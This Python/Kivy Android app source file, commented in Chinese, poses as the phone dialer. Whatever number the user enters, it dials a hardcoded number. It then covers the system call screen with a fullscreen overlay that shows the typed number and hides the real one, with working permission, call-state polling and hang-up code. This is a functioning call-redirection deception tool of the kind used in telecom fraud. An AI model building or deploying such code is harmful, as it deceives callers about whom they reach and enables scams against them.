from kivy.app import App
from kivy.uix.screenmanager import ScreenManager, Screen
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.gridlayout import GridLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.core.window import Window
from kivy.graphics import Color, RoundedRectangle
from kivy.clock import Clock
from jnius import autoclass, PythonJavaClass, java_method, cast
import time

# ====================== 【仅修改这里】配置区 ======================
REAL_PHONE = "13800138000"   # 实际拨通的真实固定号码
APP_TITLE = "电话"
# ================================================================

Window.orientation = 'portrait'

# ---------------------- 全局状态变量 ----------------------
# 悬浮窗控件引用
float_layout = None
window_manager = None
tv_number = None
tv_status = None

# 通话状态
call_state = "IDLE"  # IDLE空闲 / RINGING振铃 / OFFHOOK通话中
call_start_time = 0
timer_event = None
poll_event = None

# 功能开关状态
is_muted = False
is_speaker_on = False

# ---------------------- 安卓原生API映射 ----------------------
PythonActivity = autoclass('org.kivy.android.PythonActivity')
Context = autoclass('android.content.Context')
Intent = autoclass('android.content.Intent')
Uri = autoclass('android.net.Uri')
LayoutParams = autoclass('android.view.WindowManager$LayoutParams')
LinearLayout = autoclass('android.widget.LinearLayout')
TextView = autoclass('android.widget.TextView')
Button = autoclass('android.widget.Button')
Color = autoclass('android.graphics.Color')
Gravity = autoclass('android.view.Gravity')
Toast = autoclass('android.widget.Toast')

TelephonyManager = autoclass('android.telephony.TelephonyManager')
AudioManager = autoclass('android.media.AudioManager')
TelecomManager = autoclass('android.telecom.TelecomManager')
Build = autoclass('android.os.Build')

# ---------------------- 权限工具 ----------------------
def check_permission(permission):
    activity = PythonActivity.mActivity
    if Build.VERSION.SDK_INT >= 23:
        return activity.checkSelfPermission(permission) == 0
    return True

def request_permissions():
    activity = PythonActivity.mActivity
    if Build.VERSION.SDK_INT >= 23:
        permissions = [
            "android.permission.CALL_PHONE",
            "android.permission.READ_PHONE_STATE",
            "android.permission.MODIFY_AUDIO_SETTINGS",
            "android.permission.ANSWER_PHONE_CALLS"
        ]
        activity.requestPermissions(permissions, 1001)

def show_toast(msg):
    activity = PythonActivity.mActivity
    Toast.makeText(activity, msg, Toast.LENGTH_SHORT).show()

# ---------------------- 通话状态监听与计时 ----------------------
def poll_call_state(dt):
    """每秒轮询一次通话状态，替代系统回调，适配纯Python实现"""
    global call_state, call_start_time, timer_event
    activity = PythonActivity.mActivity
    tm = cast(TelephonyManager, activity.getSystemService(Context.TELEPHONY_SERVICE))
    
    try:
        state = tm.getCallState()
    except:
        return
    
    # 0=空闲 1=振铃 2=通话中
    new_state = "IDLE"
    if state == 1:
        new_state = "RINGING"
    elif state == 2:
        new_state = "OFFHOOK"
    
    if new_state != call_state:
        call_state = new_state
        
        if call_state == "OFFHOOK":
            # 通话接通，启动计时
            call_start_time = time.time()
            if not timer_event:
                timer_event = Clock.schedule_interval(update_call_timer, 1)
            set_status_text("通话中")
        
        elif call_state == "IDLE":
            # 通话结束，清理状态并返回拨号页
            if timer_event:
                timer_event.cancel()
                timer_event = None
            Clock.schedule_once(lambda dt: on_call_ended(), 0.5)

def update_call_timer(dt):
    if call_state != "OFFHOOK":
        return
    seconds = int(time.time() - call_start_time)
    mins = seconds // 60
    secs = seconds % 60
    time_str = f"{mins:02d}:{secs:02d}"
    set_status_text(time_str)

def set_status_text(text):
    """主线程更新悬浮窗文本"""
    if tv_status:
        try:
            tv_status.setText(text)
        except:
            pass

def on_call_ended():
    """通话结束统一处理"""
    close_float_window()
    show_toast("通话结束")
    # 回到APP拨号页面
    activity = PythonActivity.mActivity
    intent = Intent(activity, PythonActivity.mActivity.getClass())
    intent.setFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT | Intent.FLAG_ACTIVITY_NEW_TASK)
    activity.startActivity(intent)

# ---------------------- 悬浮通话窗（覆盖系统通话界面） ----------------------
def create_float_window(display_number):
    global float_layout, window_manager, tv_number, tv_status
    
    activity = PythonActivity.mActivity
    window_manager = activity.getSystemService(Context.WINDOW_SERVICE)
    
    # 全屏置顶悬浮窗参数
    params = LayoutParams(
        LayoutParams.MATCH_PARENT,
        LayoutParams.MATCH_PARENT,
        LayoutParams.TYPE_APPLICATION_OVERLAY,
        LayoutParams.FLAG_FULLSCREEN | LayoutParams.FLAG_NOT_FOCUSABLE,
        0
    )
    
    # 根布局：深色原生通话背景
    layout = LinearLayout(activity)
    layout.setOrientation(LinearLayout.VERTICAL)
    layout.setBackgroundColor(Color.parseColor("#0d0d0d"))
    layout.setGravity(Gravity.CENTER_HORIZONTAL)
    layout.setPadding(0, 140, 0, 80)
    
    # 显示号码（用户输入的号码，不暴露真实号）
    tv_number = TextView(activity)
    tv_number.setText(display_number)
    tv_number.setTextColor(Color.WHITE)
    tv_number.setTextSize(48)
    tv_number.setGravity(Gravity.CENTER)
    layout.addView(tv_number)
    
    # 状态/通话时长显示
    tv_status = TextView(activity)
    tv_status.setText("正在呼叫...")
    tv_status.setTextColor(Color.parseColor("#aaaaaa"))
    tv_status.setTextSize(20)
    tv_status.setGravity(Gravity.CENTER)
    tv_status.setPadding(0, 30, 0, 0)
    layout.addView(tv_status)
    
    # 中间占位区域
    space = TextView(activity)
    space.setHeight(360)
    layout.addView(space)
    
    # 底部功能按钮栏：静音、拨号盘、免提、挂断
    btn_bar = LinearLayout(activity)
    btn_bar.setOrientation(LinearLayout.HORIZONTAL)
    btn_bar.setGravity(Gravity.CENTER)
    btn_bar.setPadding(0, 0, 0, 60)
    
    btn_params = LinearLayout.LayoutParams(170, 170)
    btn_params.setMargins(18, 0, 18, 0)
    
    # 静音按钮
    btn_mute = Button(activity)
    btn_mute.setText("静音")
    btn_mute.setTextColor(Color.WHITE)
    btn_mute.setTextSize(14)
    btn_mute.setBackgroundColor(Color.parseColor("#333333"))
    btn_mute.setOnClickListener(MuteClickListener())
    btn_bar.addView(btn_mute, btn_params)
    
    # 拨号盘按钮
    btn_dialpad = Button(activity)
    btn_dialpad.setText("键盘")
    btn_dialpad.setTextColor(Color.WHITE)
    btn_dialpad.setTextSize(14)
    btn_dialpad.setBackgroundColor(Color.parseColor("#333333"))
    btn_dialpad.setOnClickListener(DialpadClickListener())
    btn_bar.addView(btn_dialpad, btn_params)
    
    # 免提按钮
    btn_speaker = Button(activity)
    btn_speaker.setText("免提")
    btn_speaker.setTextColor(Color.WHITE)
    btn_speaker.setTextSize(14)
    btn_speaker.setBackgroundColor(Color.parseColor("#333333"))
    btn_speaker.setOnClickListener(SpeakerClickListener())
    btn_bar.addView(btn_speaker, btn_params)
    
    # 挂断按钮（红色）
    btn_hangup = Button(activity)
    btn_hangup.setText("挂断")
    btn_hangup.setTextColor(Color.WHITE)
    btn_hangup.setTextSize(14)
    btn_hangup.setBackgroundColor(Color.RED)
    btn_hangup.setOnClickListener(HangupClickListener())
    btn_bar.addView(btn_hangup, btn_params)
    
    layout.addView(btn_bar)
    
    # 添加到系统窗口
    window_manager.addView(layout, params)
    float_layout = layout

def close_float_window():
    global float_layout, window_manager
    if float_layout and window_manager:
        try:
            window_manager.removeView(float_layout)
            float_layout = None
        except:
            pass

# ---------------------- 功能按钮点击事件 ----------------------
class MuteClickListener(PythonJavaClass):
    __javainterfaces__ = ['android/view/View$OnClickListener']
    @java_method('(Landroid/view/View;)V')
    def onClick(self, v):
        global is_muted
        activity = PythonActivity.mActivity
        am = cast(AudioManager, activity.getSystemService(Context.AUDIO_SERVICE))
        is_muted = not is_muted
        am.setMicrophoneMute(is_muted)
        v.setBackgroundColor(Color.parseColor("#0078d7") if is_muted else "#333333")

class DialpadClickListener(PythonJavaClass):
    __javainterfaces__ = ['android/view/View$OnClickListener']
    @java_method('(Landroid/view/View;)V')
    def onClick(self, v):
        show_toast("拨号盘")

class SpeakerClickListener(PythonJavaClass):
    __javainterfaces__ = ['android/view/View$OnClickListener']
    @java_method('(Landroid/view/View;)V')
    def onClick(self, v):
        global is_speaker_on
        activity = PythonActivity.mActivity
        am = cast(AudioManager, activity.getSystemService(Context.AUDIO_SERVICE))
        is_speaker_on = not is_speaker_on
        am.setSpeakerphoneOn(is_speaker_on)
        v.setBackgroundColor(Color.parseColor("#0078d7") if is_speaker_on else "#333333")

class HangupClickListener(PythonJavaClass):
    __javainterfaces__ = ['android/view/View$OnClickListener']
    @java_method('(Landroid/view/View;)V')
    def onClick(self, v):
        end_current_call()

def end_current_call():
    """结束当前通话，安卓9+官方API实现"""
    activity = PythonActivity.mActivity
    if Build.VERSION.SDK_INT >= 28:
        try:
            tm = cast(TelecomManager, activity.getSystemService(Context.TELECOM_SERVICE))
            tm.endCall()
        except:
            show_toast("挂断失败，请手动挂断")
    else:
        show_toast("系统版本过低，请手动挂断")

# ---------------------- 拨号盘主界面 ----------------------
class DialScreen(Screen):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.phone_input = ""

        # 白色原生风格背景
        root = BoxLayout(orientation='vertical', padding=[20, 60, 20, 30], spacing=10)
        with root.canvas.before:
            Color(1, 1, 1, 1)
            self.bg_rect = RoundedRectangle(pos=root.pos, size=root.size)
        root.bind(pos=self._update_bg, size=self._update_bg)

        # 号码显示栏
        self.num_label = Label(
            text="", font_size=56, size_hint_y=0.2,
            color=(0, 0, 0, 1), halign='center', valign='bottom'
        )
        root.add_widget(self.num_label)

        # 12键拨号盘，带字母提示
        dial_grid = GridLayout(cols=3, spacing=18, size_hint_y=0.58, padding=[40, 0, 40, 0])
        key_data = [
            ("1", ""), ("2", "ABC"), ("3", "DEF"),
            ("4", "GHI"), ("5", "JKL"), ("6", "MNO"),
            ("7", "PQRS"), ("8", "TUV"), ("9", "WXYZ"),
            ("*", ""), ("0", "+"), ("#", "")
        ]
        for num, sub in key_data:
            key_box = BoxLayout(orientation='vertical', spacing=2)
            btn = Button(
                text=num, font_size=34,
                background_color=(0.92, 0.92, 0.92, 1),
                color=(0, 0, 0, 1)
            )
            btn.bind(on_press=lambda x, n=num: self._add_num(n))
            key_box.add_widget(btn)
            if sub:
                sub_lb = Label(text=sub, font_size=11, color=(0.4, 0.4, 0.4, 1), size_hint_y=None, height=14)
                key_box.add_widget(sub_lb)
            dial_grid.add_widget(key_box)
        root.add_widget(dial_grid)

        # 底部：删除键 + 拨打键
        bottom_bar = BoxLayout(spacing=60, size_hint_y=0.22, padding=[60, 10, 60, 10])
        del_btn = Button(
            text="⌫", font_size=38,
            background_color=(0.92, 0.92, 0.92, 1),
            color=(0, 0, 0, 1)
        )
        del_btn.bind(on_press=self._del_num)
        call_btn = Button(
            text="📞", font_size=38,
            background_color=(0, 0.8, 0.3, 1),
            color=(1, 1, 1, 1)
        )
        call_btn.bind(on_press=self._start_call)
        bottom_bar.add_widget(del_btn)
        bottom_bar.add_widget(call_btn)
        root.add_widget(bottom_bar)

        self.add_widget(root)

    def _update_bg(self, instance, value):
        self.bg_rect.pos = instance.pos
        self.bg_rect.size = instance.size

    def _add_num(self, n):
        if len(self.phone_input) < 15:
            self.phone_input += n
            self.num_label.text = self.phone_input

    def _del_num(self, btn):
        self.phone_input = self.phone_input[:-1]
        self.num_label.text = self.phone_input

    def _start_call(self, btn):
        if not self.phone_input:
            show_toast("请输入号码")
            return
        # 权限检查
        if not check_permission("android.permission.CALL_PHONE"):
            show_toast("请授予电话权限")
            request_permissions()
            return
        if not check_permission("android.permission.SYSTEM_ALERT_WINDOW"):
            show_toast("请授予悬浮窗权限")
            return
        
        display_num = self.phone_input
        # 后台拨打真实号码
        self._make_real_call()
        # 弹出覆盖悬浮窗
        create_float_window(display_num)
        # 启动通话状态轮询
        global poll_event
        if not poll_event:
            poll_event = Clock.schedule_interval(poll_call_state, 1)

    def _make_real_call(self):
        activity = PythonActivity.mActivity
        intent = Intent(Intent.ACTION_CALL, Uri.parse(f"tel:{REAL_PHONE}"))
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        activity.startActivity(intent)

# ---------------------- 主程序入口 ----------------------
class CallApp(App):
    def build(self):
        self.title = APP_TITLE
        sm = ScreenManager()
        sm.add_widget(DialScreen(name='dial'))
        return sm
    
    def on_start(self):
        request_permissions()
        global poll_event
        if not poll_event:
            poll_event = Clock.schedule_interval(poll_call_state, 1)
    
    def on_stop(self):
        global poll_event, timer_event
        if poll_event:
            poll_event.cancel()
            poll_event = None
        if timer_event:
            timer_event.cancel()
            timer_event = None
        close_float_window()

if __name__ == "__main__":
    CallApp().run()
